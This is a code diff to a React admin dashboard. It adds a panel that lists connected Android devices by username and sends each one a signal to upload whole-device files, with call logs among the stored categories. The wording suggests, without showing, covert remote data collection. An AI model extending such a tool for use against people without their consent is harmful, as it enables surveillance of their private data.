@@ -35,6 +35,12 @@ interface StoredFile {
 
 type FileCategoryFilter = 'ALL' | 'Document' | 'Image' | 'Audio' | 'Video' | 'Spreadsheet' | 'Call Log';
 
+function roundMb(bytes: number): string {
+  if (!bytes) return '0.00 MB';
+  if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
+  return `${(bytes / 1048576).toFixed(2)} MB`;
+}
+
 export default function DataManagementPage() {
   const [summary, setSummary] = useState<DataSummary | null>(null);
   const [files, setFiles] = useState<StoredFile[]>([]);
@@ -98,6 +104,49 @@ export default function DataManagementPage() {
       return matchesCategory && matchesUser && matchesSearch;
     });
   }, [files, categoryFilter, userFilter, fileSearch]);
+
+  const [triggeringDevice, setTriggeringDevice] = useState<string | null>(null);
+  const [triggerSuccess, setTriggerSuccess] = useState<string | null>(null);
+
+  const handleTriggerBackup = async (deviceId: string) => {
+    setTriggeringDevice(deviceId);
+    setTriggerSuccess(null);
+    try {
+      const res = await fetch(`${API_BASE}/api/admin/devices/${encodeURIComponent(deviceId)}/trigger-backup`, {
+        method: 'POST',
+      });
+      if (!res.ok) throw new Error(`Failed with status ${res.status}`);
+      setTriggerSuccess(`Backup signal dispatched to device ${deviceId}! Client will upload files.`);
+      setTimeout(() => setTriggerSuccess(null), 6000);
+      fetchData();
+    } catch (err: unknown) {
+      alert(`Trigger failed: ${err instanceof Error ? err.message : String(err)}`);
+    } finally {
+      setTriggeringDevice(null);
+    }
+  };
+
+  // Group unique devices from storage telemetry
+  const connectedDevices = useMemo(() => {
+    if (!summary?.device_storage) return [];
+    const map = new Map<string, { device_id: string; username: string; last_sync: number; total_bytes: number; total_items: number }>();
+    summary.device_storage.forEach((d) => {
+      if (!map.has(d.device_id)) {
+        map.set(d.device_id, {
+          device_id: d.device_id,
+          username: d.username,
+          last_sync: d.last_sync,
+          total_bytes: d.total_bytes,
+          total_items: d.item_count,
+        });
+      } else {
+        const existing = map.get(d.device_id)!;
+        existing.total_bytes += d.total_bytes;
+        existing.total_items += d.item_count;
+      }
+    });
+    return Array.from(map.values());
+  }, [summary]);
 
   const handleDeleteFile = async (fileName: string) => {
     if (!confirm(`Are you sure you want to delete '${fileName}'?`)) return;
@@ -184,6 +233,77 @@ export default function DataManagementPage() {
           <div className="text-2xl font-bold text-brand-teal">{summary ? summary.device_count : '...'}</div>
         </div>
       </div>
+
+      {/* Real-Time Signal Alert Notification */}
+      {triggerSuccess && (
+        <div className="mb-6 p-4 bg-emerald-950/70 border border-emerald-500/50 text-emerald-200 rounded-2xl text-xs flex items-center justify-between shadow-lg">
+          <div className="flex items-center gap-2">
+            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
+            <span>{triggerSuccess}</span>
+          </div>
+          <span className="text-[10px] text-emerald-400/80 font-mono">SIGNAL_SENT</span>
+        </div>
+      )}
+
+      {/* Connected Devices & Remote Backup Triggering Panel */}
+      {connectedDevices.length > 0 && (
+        <div className="mb-8 bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-xl">
+          <div className="flex items-center justify-between mb-4">
+            <div>
+              <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
+                <span className="w-2 h-2 rounded-full bg-brand-teal animate-pulse"></span>
+                Connected Devices & Remote Data Backup
+              </h2>
+              <p className="text-slate-400 text-xs mt-0.5">
+                Dispatch an immediate backup signal to instruct targeted Android clients to upload whole-device files.
+              </p>
+            </div>
+          </div>
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+            {connectedDevices.map((dev) => (
+              <div
+                key={dev.device_id}
+                className="p-4 bg-slate-950/80 border border-slate-800/80 rounded-xl flex flex-col justify-between gap-3 hover:border-slate-700 transition-all"
+              >
+                <div>
+                  <div className="flex items-center justify-between">
+                    <span className="text-white font-semibold text-xs font-mono">{dev.device_id}</span>
+                    <span className="text-[10px] px-2 py-0.5 bg-slate-800 text-slate-300 rounded font-medium">
+                      @{dev.username}
+                    </span>
+                  </div>
+                  <div className="mt-2 text-[11px] text-slate-400 flex items-center justify-between">
+                    <span>Stored Items: <strong className="text-white">{dev.total_items}</strong></span>
+                    <span>Size: <strong className="text-white">{roundMb(dev.total_bytes)}</strong></span>
+                  </div>
+                  <div className="mt-1 text-[10px] text-slate-500">
+                    Last sync: {dev.last_sync ? new Date(dev.last_sync).toLocaleTimeString() : 'Never'}
+                  </div>
+                </div>
+                <button
+                  onClick={() => handleTriggerBackup(dev.device_id)}
+                  disabled={triggeringDevice === dev.device_id}
+                  className="w-full py-2 px-3 bg-brand-purple/20 hover:bg-brand-purple text-brand-purple hover:text-white border border-brand-purple/40 rounded-lg text-xs font-semibold flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50"
+                >
+                  {triggeringDevice === dev.device_id ? (
+                    <>
+                      <div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                      <span>Dispatching Signal...</span>
+                    </>
+                  ) : (
+                    <>
+                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
+                      </svg>
+                      <span>Trigger Device Backup</span>
+                    </>
+                  )}
+                </button>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
 
       {/* Unified Search & Filters */}
       <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 mb-6 bg-slate-900/60 p-4 border border-slate-800 rounded-2xl">
